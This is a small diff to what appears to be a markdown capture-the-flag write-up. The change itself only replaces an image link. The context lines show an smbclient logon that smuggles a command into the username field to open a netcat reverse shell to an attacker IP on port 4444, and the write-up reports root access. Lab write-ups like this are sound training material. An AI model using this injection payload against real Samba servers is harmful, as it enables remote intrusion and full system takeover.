@@ -273,7 +273,8 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 smb: \> logon "./=`nohup nc -e /bin/bash 10.10.XX.XX 4444`"
 Password: 
 ```
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4fdc051b-97ca-4198-a4f3-091a1f5a7cf6)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/48192019-6577-4ba7-b80c-3ab5663776fd)
+
 <br>
 <br>
 Got the shell as root.
